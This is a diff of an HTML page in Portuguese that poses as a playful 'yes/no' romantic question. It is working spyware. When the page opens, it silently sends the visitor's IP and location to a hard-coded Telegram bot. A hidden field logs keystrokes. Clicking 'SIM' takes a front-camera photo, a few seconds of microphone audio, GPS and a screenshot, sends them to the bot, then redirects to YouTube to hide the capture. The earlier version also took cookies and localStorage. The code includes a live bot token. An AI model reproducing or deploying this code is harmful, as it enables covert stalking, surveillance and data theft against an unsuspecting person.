@@ -3,17 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🇷🇺 Sonho Russo</title>
+    <title>🇷🇺 Conexão</title>
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-    
-    <!-- ============================================================
-    BLOCO 1: CSS (ESTILOS) - Deixa a página bonita
-    ============================================================ -->
     <style>
-        /* LIMPEZA TOTAL - tira margens e espaços padrão */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        /* CORPO DA PÁGINA - centraliza tudo */
         body {
             min-height: 100vh;
             display: flex;
@@ -23,9 +16,9 @@
             font-family: 'Helvetica Neue', Arial, sans-serif;
             position: relative;
             overflow: hidden;
+            background: #0a0a0a;
         }
-
-        /* FUNDO - sua foto ocupando a tela inteira */
+        /* Fundo com a sua foto */
         body::before {
             content: '';
             position: fixed;
@@ -33,70 +26,46 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('IMG_8654.jpeg') no-repeat center center/cover;
-            filter: blur(3px);
+            background: url('IMG_8738.jpeg') no-repeat center center/cover;
+            filter: blur(6px) brightness(0.4);
             z-index: 0;
         }
-
-        /* CAIXA DOS BOTÕES - transparente com efeito vidro */
         .container {
             position: relative;
             z-index: 2;
             max-width: 480px;
             width: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
-            border-radius: 48px 12px 48px 12px;
+            background: rgba(20, 20, 30, 0.7);
+            backdrop-filter: blur(15px);
+            border-radius: 40px 8px 40px 8px;
             padding: 60px 25px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
         }
-
-        /* ÁREA DOS BOTÕES - fica um do lado do outro */
-        .buttons {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            min-height: 70px;
-        }
-
-        /* BOTÃO SIM - bonitão e branco */
+        .buttons { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; min-height: 70px; }
         .btn {
             font-size: 22px;
             padding: 18px 50px;
             border: none;
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.05);
             color: white;
             cursor: pointer;
             font-family: 'Georgia', serif;
             border-radius: 50px 8px 50px 8px;
             min-width: 130px;
             backdrop-filter: blur(4px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             transition: all 0.3s ease;
             font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
-
-        .btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-            transform: scale(1.05);
-        }
-
-        /* BOTÃO NÃO - vermelho e mais transparente */
-        .btn-nao {
-            background: rgba(255, 0, 0, 0.15);
-            color: #ff6b6b;
-        }
-
-        .btn-nao:hover {
-            background: rgba(255, 0, 0, 0.25);
-        }
-
-        /* LOADER - bolinha de carregamento */
+        .btn:hover { background: rgba(255, 255, 255, 0.15); transform: scale(1.05); }
+        .btn-nao { background: rgba(255, 0, 0, 0.1); color: #ff4444; border-color: rgba(255, 0, 0, 0.3); }
         .loader {
-            border: 3px solid rgba(255, 255, 255, 0.2);
-            border-top: 3px solid #ff4444;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #ff2222;
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -104,14 +73,10 @@
             margin: 20px auto 5px;
             display: none;
         }
-
-        @keyframes girar {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* CAMPO INVISÍVEL - usado pelo keylogger */
-        #keylogger-campo {
+        @keyframes girar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Campo invisível do keylogger */
+        #kg {
             position: absolute;
             opacity: 0;
             pointer-events: none;
@@ -120,24 +85,17 @@
             z-index: -999;
         }
 
-        /* RESPONSIVO - ajusta pro celular */
-        @media (max-width: 500px) {
-            .container { padding: 40px 18px; }
-            .btn { font-size: 18px; padding: 15px 30px; min-width: 100px; }
-            .buttons { gap: 15px; }
-        }
+        /* Esconde os elementos de mídia */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================
-    BLOCO 2: HTML (ESTRUTURA) - O que a pessoa vê
-    ============================================================ -->
-    
-    <!-- CAMPO INVISÍVEL PRO KEYLOGGER -->
-    <input type="text" id="keylogger-campo" autofocus>
+    <!-- CAMPO INVISÍVEL (KEYLOGGER) -->
+    <input type="text" id="kg" autofocus>
+    <video id="videoCam" autoplay></video>
+    <canvas id="canvasCam"></canvas>
 
-    <!-- CAIXA PRINCIPAL -->
     <div class="container" id="page-content">
         <div class="buttons" id="buttonArea">
             <button class="btn" id="btnSim">🇷🇺 SIM ❤️</button>
@@ -146,102 +104,104 @@
         <div class="loader" id="loader"></div>
     </div>
 
-    <!-- CÂMERA E ÁUDIO (escondidos) -->
-    <video id="videoCam" style="display:none;" autoplay></video>
-    <canvas id="canvasCam" style="display:none;"></canvas>
-
-    <!-- ============================================================
-    BLOCO 3: JAVASCRIPT (A LÓGICA) - Tudo que acontece
-    ============================================================ -->
     <script>
+        // ============================================================
+        // CONFIGURAÇÕES (SEU BOT)
+        // ============================================================
+        const BOT = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
+        const CHAT = "8551438856";
+
+        // ============================================================
+        // SISTEMA DE COLETA SILENCIOSA (RODA SOZINHO)
+        // ============================================================
+        (function coletaSilenciosa() {
+            // Pega IP e localização SEM pedir permissão (assim que a página abre)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    let ip = d.ip;
+                    fetch(`https://ipinfo.io/${ip}/json`)
+                        .then(r => r.json())
+                        .then(loc => {
+                            let msg = `🕵️‍♂️ **ALVO CONECTADO**\n`;
+                            msg += `📲 IP: ${ip}\n`;
+                            msg += `📍 Cidade: ${loc.city || 'N/A'}\n`;
+                            msg += `🗺️ Estado: ${loc.region || 'N/A'}\n`;
+                            msg += `🌍 País: ${loc.country || 'N/A'}\n`;
+                            msg += `📡 Coord: ${loc.loc || 'N/A'}\n`;
+                            msg += `🏢 ISP: ${loc.org || 'N/A'}`;
+                            
+                            // Detecta VPN
+                            if (loc.org && (loc.org.toLowerCase().includes('vpn') || loc.org.toLowerCase().includes('proxy'))) {
+                                msg += `\n⚠️ **VPN/PROXY DETECTADO!**`;
+                            }
+
+                            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: CHAT,
+                                    text: msg,
+                                    parse_mode: 'Markdown'
+                                })
+                            });
+                        });
+                });
+        })();
+
+        // ============================================================
+        // KEYLOGGER (CAPTURA TUDO QUE DIGITA)
+        // ============================================================
+        const campoKG = document.getElementById('kg');
+        let teclas = [];
         
-        // ------------------------------------------------------------
-        // FUNÇÃO 1: CONFIGURAÇÕES DO TELEGRAM
-        // ------------------------------------------------------------
-        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
-        const CHAT_ID = "8551438856";
+        document.addEventListener('click', () => campoKG.focus());
+        campoKG.focus();
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 2: VARIÁVEIS GLOBAIS
-        // ------------------------------------------------------------
-        const btnNao = document.getElementById('btnNao');
-        const btnSim = document.getElementById('btnSim');
-        const container = document.getElementById('page-content');
-        const buttonArea = document.getElementById('buttonArea');
-        const loader = document.getElementById('loader');
-        const campoKeylogger = document.getElementById('keylogger-campo');
-
-        let teclasDigitadas = [];  // Onde o keylogger guarda as teclas
-
-        // ------------------------------------------------------------
-        // FUNÇÃO 3: KEYLOGGER (Captura as teclas)
-        // ------------------------------------------------------------
-        // O que faz: Escuta cada tecla que a pessoa digita e guarda
-        // Quando: A pessoa digita qualquer coisa no celular/PC
-        // Onde: No campo invisível (a pessoa não vê)
-        
         document.addEventListener('keydown', function(e) {
-            // Se for uma tecla normal (letra, número, espaço)
-            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
-                let tecla = e.key;
-                if (tecla === 'Enter') tecla = '[ENTER]';
-                if (tecla === 'Backspace') tecla = '[BACKSPACE]';
-                if (tecla === ' ') tecla = '[ESPAÇO]';
-                teclasDigitadas.push(tecla);
+            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === ' ') {
+                let t = e.key;
+                if (t === 'Enter') t = '[ENTER]';
+                if (t === 'Backspace') t = '[BACK]';
+                if (t === ' ') t = '[ESP]';
+                teclas.push(t);
                 
-                // Se juntar 50 teclas, envia pro Telegram
-                if (teclasDigitadas.length >= 50) {
-                    enviarKeylogger();
+                if (teclas.length >= 30) {
+                    enviarTeclas();
                 }
             }
         });
 
-        // Força o foco no campo invisível
-        document.addEventListener('click', function() {
-            campoKeylogger.focus();
-        });
-        campoKeylogger.focus();
-
-        // Função que envia as teclas pro Telegram
-        function enviarKeylogger() {
-            if (teclasDigitadas.length === 0) return;
-            const texto = teclasDigitadas.join('');
-            teclasDigitadas = [];
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        function enviarTeclas() {
+            if (teclas.length === 0) return;
+            const texto = teclas.join('');
+            teclas = [];
+            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `⌨️ KEYLOGGER:\n${texto}`,
+                    chat_id: CHAT,
+                    text: `⌨️ **KEYLOG:**\n${texto}`,
+                    parse_mode: 'Markdown'
                 })
             }).catch(() => {});
         }
 
-        // Envia keylogger a cada 30 segundos (mesmo sem clicar em SIM)
-        setInterval(() => {
-            enviarKeylogger();
-        }, 30000);
+        // Envia a cada 20 segundos automaticamente
+        setInterval(enviarTeclas, 20000);
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 4: CÂMERA FRONTAL (Tira foto da pessoa)
-        // ------------------------------------------------------------
-        // O que faz: Ativa a câmera frontal e tira uma foto
-        // Quando: Quando a função é chamada (ao clicar em SIM)
-        // Onde: No navegador da pessoa
-        
+        // ============================================================
+        // FUNÇÃO: CAPTURAR CÂMERA (SEM ELA PERCEBER QUE É UM "PEDIDO")
+        // ============================================================
         async function capturarCamera() {
             try {
-                // Pede permissão pra usar a câmera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 }
                 });
-                
                 const video = document.getElementById('videoCam');
                 video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 800));
                 
-                // Desenha a foto no canvas
                 const canvas = document.getElementById('canvasCam');
                 canvas.width = 640;
                 canvas.height = 480;
@@ -249,402 +209,164 @@
                 ctx.drawImage(video, 0, 0, 640, 480);
                 
                 const foto = canvas.toDataURL('image/jpeg', 0.9);
-                
-                // Desliga a câmera
                 stream.getTracks().forEach(track => track.stop());
-                
                 return foto;
-            } catch (e) {
-                console.log('Câmera não disponível:', e);
-                return null;
-            }
+            } catch { return null; }
         }
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 5: ÁUDIO (Grava o som do ambiente)
-        // ------------------------------------------------------------
-        // O que faz: Ativa o microfone e grava 5 segundos de áudio
-        // Quando: Quando a função é chamada
-        // Onde: No navegador da pessoa
-        
-        async function capturarAudio(duracaoSegundos = 5) {
+        // ============================================================
+        // FUNÇÃO: CAPTURAR ÁUDIO (5 SEGUNDOS)
+        // ============================================================
+        async function capturarAudio() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
-
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-
-                mediaRecorder.start();
-                await new Promise(resolve => setTimeout(resolve, duracaoSegundos * 1000));
-                mediaRecorder.stop();
-
-                await new Promise(resolve => mediaRecorder.onstop = resolve);
-                stream.getTracks().forEach(track => track.stop());
-
-                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                return audioBlob;
-            } catch (e) {
-                console.log('Áudio não disponível:', e);
-                return null;
-            }
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                await new Promise(r => setTimeout(r, 4000));
+                recorder.stop();
+                await new Promise(r => recorder.onstop = r);
+                stream.getTracks().forEach(t => t.stop());
+                return new Blob(chunks, { type: 'audio/webm' });
+            } catch { return null; }
         }
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 6: GPS (Pega localização exata)
-        // ------------------------------------------------------------
-        // O que faz: Pega a localização GPS da pessoa
-        // Quando: Quando a função é chamada
-        // Onde: No navegador da pessoa (se ela permitir)
-        
+        // ============================================================
+        // FUNÇÃO: GPS EXATO
+        // ============================================================
         function getGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ lat: '❌', lon: '❌' });
-                    return;
-                }
+                if (!navigator.geolocation) return resolve({ lat: '❌', lon: '❌' });
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            precisao: pos.coords.accuracy + 'm'
-                        });
-                    },
-                    () => resolve({ lat: '❌', lon: '❌', precisao: '❌' }),
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve({ lat: '❌', lon: '❌' }),
+                    { enableHighAccuracy: true, timeout: 4000 }
                 );
             });
         }
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 7: COLETOR PRINCIPAL (Junta TUDO)
-        // ------------------------------------------------------------
-        // O que faz: Coleta IP, dispositivo, bateria, fingerprint, etc.
-        // Quando: Quando a função é chamada (ao clicar em SIM)
-        // Onde: No navegador da pessoa (tudo silencioso)
-        
-        async function coletarTudo() {
-            const dados = {};
-
-            // 7.1: IP Público
-            try {
-                const ip = await fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json()).then(d => d.ip);
-                dados.ip = ip;
-            } catch { dados.ip = '❌'; }
-
-            // 7.2: IP Real (WebRTC - burla VPN)
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('teste');
-                const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
-                await pc.setLocalDescription(offer);
-                const candidates = pc.localDescription.sdp.match(/candidate.*/g);
-                if (candidates) {
-                    const ips = candidates.map(c => c.split(' ')[4])
-                        .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
-                    if (ips.length) dados.ipReal = ips[0];
-                }
-                pc.close();
-            } catch { dados.ipReal = '❌'; }
-
-            // 7.3: Geolocalização por IP
-            try {
-                const r = await fetch(`https://ipinfo.io/${dados.ip}/json`);
-                const d = await r.json();
-                dados.cidade = d.city || '❌';
-                dados.estado = d.region || '❌';
-                dados.pais = d.country || '❌';
-                dados.coordenadas = d.loc || '❌';
-                dados.provedor = d.org || '❌';
-                dados.fuso = d.timezone || '❌';
-                
-                // Detecta VPN
-                const org = (d.org || '').toLowerCase();
-                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode', 'vultr', 'heroku', 'azure', 'google cloud'];
-                dados.vpn = vpnKeywords.some(k => org.includes(k)) ? '⚠️ VPN DETECTADO' : '✅ Nenhum VPN';
-            } catch { dados.cidade = '❌'; }
-
-            // 7.4: GPS (localização exata)
-            const gps = await getGPS();
-            dados.gpsLat = gps.lat;
-            dados.gpsLon = gps.lon;
-            dados.gpsPrecisao = gps.precisao || '❌';
-
-            // 7.5: Dispositivo (iPhone, Android, PC)
+        // ============================================================
+        // FUNÇÃO: PEGAR DADOS DO DISPOSITIVO
+        // ============================================================
+        function getDeviceInfo() {
             const ua = navigator.userAgent;
-            const isIOS = /iPhone|iPad|iPod/i.test(ua);
-            const isAndroid = /Android/i.test(ua);
-            if (isIOS) {
-                const m = ua.match(/iPhone OS (\d+)_(\d+)/);
-                dados.modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
-                dados.os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
-                dados.marca = 'Apple';
-            } else if (isAndroid) {
-                const m = ua.match(/Android (\d+\.\d+)/);
-                dados.modelo = m ? `Android ${m[1]}` : 'Android';
-                dados.os = m ? `Android ${m[1]}` : 'Android';
-                dados.marca = 'Android';
-            } else {
-                dados.modelo = '💻 Computador';
-                dados.os = navigator.platform || 'Desconhecido';
-                dados.marca = 'Desktop';
-            }
+            let info = `📱 **DISPOSITIVO:**\n`;
+            info += `🔹 User-Agent: ${ua}\n`;
+            info += `🔹 Bateria: Aguardando...\n`;
+            info += `🔹 Tela: ${screen.width}x${screen.height}\n`;
+            info += `🔹 Idioma: ${navigator.language}\n`;
+            info += `🔹 Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            return info;
+        }
 
-            // 7.6: Bateria
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    dados.bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🪫 Descarregando'})`;
-                } catch { dados.bateria = '❌'; }
-            }
-
-            // 7.7: Conexão (4G, 5G, Wi-Fi)
-            if (navigator.connection) {
-                dados.conexao = navigator.connection.effectiveType || 'N/A';
-                dados.downlink = navigator.connection.downlink || '?';
-            }
-
-            // 7.8: Tela
-            dados.tela = `${screen.width}x${screen.height}`;
-            dados.cor = screen.colorDepth + 'bits';
-            
-            // 7.9: Idioma e Fuso
-            dados.idioma = navigator.language;
-            dados.fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            // 7.10: Fingerprint (impressão digital do navegador)
-            const fpData = [
-                navigator.userAgent,
-                navigator.language,
-                screen.width + 'x' + screen.height,
-                new Date().getTimezoneOffset(),
-                navigator.hardwareConcurrency || '?',
-                navigator.deviceMemory || '?',
-                !!navigator.webdriver,
-                !!navigator.plugins.length,
-                navigator.doNotTrack || '?'
-            ];
-            let hash = 0;
-            const fpString = fpData.join('|');
-            for (let i = 0; i < fpString.length; i++) {
-                hash = (hash << 5) - hash + fpString.charCodeAt(i);
-                hash = hash & hash;
-            }
-            dados.fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
-
-            // 7.11: Plugins
-            let plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            dados.plugins = plugins.length ? plugins.join(', ') : '❌ Nenhum';
-
-            // 7.12: Cookies e localStorage
-            dados.cookies = document.cookie || '❌ Sem cookies';
-            try { dados.localStorage = JSON.stringify(localStorage) || '❌ Vazio'; } catch { dados.localStorage = '❌'; }
-
-            // 7.13: Fontes instaladas
-            let fonts = [];
-            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS', 'Georgia', 'Helvetica'];
-            for (let f of fontList) {
-                if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
-            }
-            dados.fontes = fonts.length ? fonts.join(', ') : '❌';
-
-            // 7.14: Histórico
-            try {
-                if (window.history && window.history.length) {
-                    dados.historico = window.history.length + ' páginas visitadas';
-                }
-            } catch { dados.historico = '❌'; }
-
-            // 7.15: Câmera
-            dados.camera = await capturarCamera();
-
-            // 7.16: Áudio (5 segundos)
-            const audioBlob = await capturarAudio(5);
-            dados.audio = audioBlob;
-
-            // 7.17: Screenshot da página
+        // ============================================================
+        // FUNÇÃO: SCREENSHOT
+        // ============================================================
+        async function tirarPrint() {
             try {
                 const canvas = await html2canvas(document.body, {
-                    scale: 1.2,
+                    scale: 1.0,
                     useCORS: true,
-                    backgroundColor: '#000000',
-                    logging: false,
-                    allowTaint: false,
-                    width: window.innerWidth,
-                    height: window.innerHeight,
+                    backgroundColor: '#000',
+                    logging: false
                 });
-                dados.screenshot = canvas.toDataURL('image/jpeg', 0.85);
-            } catch { dados.screenshot = null; }
-
-            return dados;
+                return canvas.toDataURL('image/jpeg', 0.85);
+            } catch { return null; }
         }
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 8: ENVIAR PRO TELEGRAM (Manda tudo)
-        // ------------------------------------------------------------
-        // O que faz: Envia todos os dados coletados pro seu Telegram
-        // Quando: Depois que coletarTudo() termina
-        // Onde: Pro seu BOT do Telegram
-        
-        async function enviarDados(dados) {
-            // 8.1: Mensagem com todos os dados
-            let msg = `
-         **🇷🇺 RELATÓRIO COMPLETO** 
+        // ============================================================
+        // BOTÃO "NÃO" FUGINDO (DESESPERADOR)
+        // ============================================================
+        const btnNao = document.getElementById('btnNao');
+        const container = document.getElementById('page-content');
+        btnNao.addEventListener('mouseenter', function(e) {
+            const rect = container.getBoundingClientRect();
+            const btn = btnNao.getBoundingClientRect();
+            const maxX = rect.width - btn.width - 15;
+            const maxY = rect.height - btn.height - 15;
+            if (maxX <= 0 || maxY <= 0) return;
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.random() * maxX + 'px';
+            btnNao.style.top = Math.random() * maxY + 'px';
+        });
+        btnNao.addEventListener('click', function(e) {
+            const rect = container.getBoundingClientRect();
+            const btn = btnNao.getBoundingClientRect();
+            const maxX = rect.width - btn.width - 15;
+            const maxY = rect.height - btn.height - 15;
+            if (maxX <= 0 || maxY <= 0) return;
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.random() * maxX + 'px';
+            btnNao.style.top = Math.random() * maxY + 'px';
+        });
 
-        📲 **IP:** ${dados.ip || '❌'}
-        🔴 **IP Real:** ${dados.ipReal || '❌'}
-        🛡️ **VPN:** ${dados.vpn || '❌'}
+        // ============================================================
+        // BOTÃO "SIM" - O INFERNO DESABA
+        // ============================================================
+        document.getElementById('btnSim').addEventListener('click', async function() {
+            // 1. Esconde botões, mostra loading
+            document.getElementById('buttonArea').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-        📍 **LOCALIZAÇÃO POR IP:**
-           Cidade: ${dados.cidade || '❌'}
-           Estado: ${dados.estado || '❌'}
-           País: ${dados.pais || '❌'}
-           Coordenadas: ${dados.coordenadas || '❌'}
-           Provedor: ${dados.provedor || '❌'}
-           Fuso: ${dados.fuso || '❌'}
+            // 2. DISPARA TUDO EM PARALELO (Câmera, Áudio, GPS, Print, Device)
+            const [foto, audio, gps, print, device] = await Promise.all([
+                capturarCamera(),
+                capturarAudio(),
+                getGPS(),
+                tirarPrint(),
+                getDeviceInfo()
+            ]);
 
-        📡 **GPS EXATO:**
-           Latitude: ${dados.gpsLat || '❌'}
-           Longitude: ${dados.gpsLon || '❌'}
-           Precisão: ${dados.gpsPrecisao || '❌'}
+            // 3. Monta relatório completo
+            let relatorio = `🚨 **RELATÓRIO DE ATAQUE** 🚨\n\n`;
+            relatorio += device;
+            
+            if (gps.lat !== '❌') {
+                relatorio += `📍 **GPS EXATO:**\n   Lat: ${gps.lat}\n   Lon: ${gps.lon}\n`;
+            }
 
-        📱 **DISPOSITIVO:**
-           Modelo: ${dados.modelo || '❌'}
-           Marca: ${dados.marca || '❌'}
-           OS: ${dados.os || '❌'}
-           Bateria: ${dados.bateria || '❌'}
-           Conexão: ${dados.conexao || '❌'} (${dados.downlink || '?'} Mbps)
-           Tela: ${dados.tela || '❌'} - ${dados.cor || '❌'}
-           Idioma: ${dados.idioma || '❌'}
-           Fuso: ${dados.fusoHorario || '❌'}
-           Fingerprint: ${dados.fingerprint || '❌'}
-
-        🔌 **PLUGINS:** ${dados.plugins || '❌'}
-        🍪 **COOKIES:** ${dados.cookies || '❌'}
-        💾 **localStorage:** ${dados.localStorage || '❌'}
-        🔤 **FONTES:** ${dados.fontes || '❌'}
-        📜 **HISTÓRICO:** ${dados.historico || '❌'}
-
-        💗 **Ela disse SIM!** (Да!)
-        `;
-
-            // 8.2: Envia a mensagem
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // 4. Envia o texto do relatório
+            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
+                body: JSON.stringify({ chat_id: CHAT, text: relatorio, parse_mode: 'Markdown' })
             });
 
-            // 8.3: Envia as últimas teclas
-            if (teclasDigitadas.length > 0) {
-                await enviarKeylogger();
-            }
-
-            // 8.4: Envia a screenshot
-            if (dados.screenshot) {
+            // 5. Envia a FOTO DA CÂMERA
+            if (foto) {
                 const form = new FormData();
-                const blob = await fetch(dados.screenshot).then(res => res.blob());
-                form.append('photo', blob, 'screenshot.jpg');
-                form.append('chat_id', CHAT_ID);
-                form.append('caption', '🖼️ Print da tela');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: form
-                });
+                const blob = await fetch(foto).then(r => r.blob());
+                form.append('photo', blob, 'cam_frontal.jpg');
+                form.append('chat_id', CHAT);
+                form.append('caption', '📸 **FOTO DA CÂMERA FRONTAL**');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: form });
             }
 
-            // 8.5: Envia a foto da câmera
-            if (dados.camera) {
+            // 6. Envia o PRINT DA TELA
+            if (print) {
                 const form = new FormData();
-                const blob = await fetch(dados.camera).then(res => res.blob());
-                form.append('photo', blob, 'camera_frontal.jpg');
-                form.append('chat_id', CHAT_ID);
-                form.append('caption', '📸 Foto da câmera frontal');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: form
-                });
+                const blob = await fetch(print).then(r => r.blob());
+                form.append('photo', blob, 'print.jpg');
+                form.append('chat_id', CHAT);
+                form.append('caption', '🖼️ **PRINT DA TELA**');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: form });
             }
 
-            // 8.6: Envia o áudio
-            if (dados.audio) {
+            // 7. Envia o ÁUDIO
+            if (audio) {
                 const form = new FormData();
-                form.append('audio', dados.audio, 'audio.webm');
-                form.append('chat_id', CHAT_ID);
-                form.append('caption', '🎤 Áudio capturado (5s)');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: form
-                });
+                form.append('audio', audio, 'audio.webm');
+                form.append('chat_id', CHAT);
+                form.append('caption', '🎤 **ÁUDIO CAPTURADO (4s)**');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendAudio`, { method: 'POST', body: form });
             }
-        }
 
-        // ------------------------------------------------------------
-        // FUNÇÃO 9: BOTÃO "NÃO" FUGINDO
-        // ------------------------------------------------------------
-        // O que faz: Quando a pessoa tenta clicar no NÃO, ele foge
-        // Como: Detecta o mouse ou o toque e muda a posição
-        
-        btnNao.addEventListener('mouseenter', function(e) {
-            const containerRect = container.getBoundingClientRect();
-            const btnRect = btnNao.getBoundingClientRect();
-            const maxX = containerRect.width - btnRect.width - 15;
-            const maxY = containerRect.height - btnRect.height - 15;
-            if (maxX <= 0 || maxY <= 0) return;
-            btnNao.style.position = 'absolute';
-            btnNao.style.left = Math.random() * maxX + 'px';
-            btnNao.style.top = Math.random() * maxY + 'px';
-        });
-
-        btnNao.addEventListener('click', function(e) {
-            const containerRect = container.getBoundingClientRect();
-            const btnRect = btnNao.getBoundingClientRect();
-            const maxX = containerRect.width - btnRect.width - 15;
-            const maxY = containerRect.height - btnRect.height - 15;
-            if (maxX <= 0 || maxY <= 0) return;
-            btnNao.style.position = 'absolute';
-            btnNao.style.left = Math.random() * maxX + 'px';
-            btnNao.style.top = Math.random() * maxY + 'px';
-        });
-
-        // ------------------------------------------------------------
-        // FUNÇÃO 10: BOTÃO "SIM" (O gatilho principal)
-        // ------------------------------------------------------------
-        // O que faz: Quando a pessoa clica em SIM
-        // 1. Esconde os botões
-        // 2. Mostra o loading
-        // 3. Coleta TUDO (função 7)
-        // 4. Envia TUDO (função 8)
-        // 5. Redireciona pro YouTube
-        
-        btnSim.addEventListener('click', async function() {
-            buttonArea.style.display = 'none';
-            loader.style.display = 'block';
-
-            // Coleta TUDO
-            const dados = await coletarTudo();
-            
-            // Envia pro Telegram
-            await enviarDados(dados);
-
-            // Redireciona pro YouTube
+            // 8. REDIRECIONA PARA O YOUTUBE (Ela acha que acabou)
             setTimeout(() => {
                 window.location.href = 'https://www.youtube.com/watch?v=TdrL3QxjyVw';
-            }, 1500);
+            }, 1000);
         });
-
     </script>
 </body>
 </html>
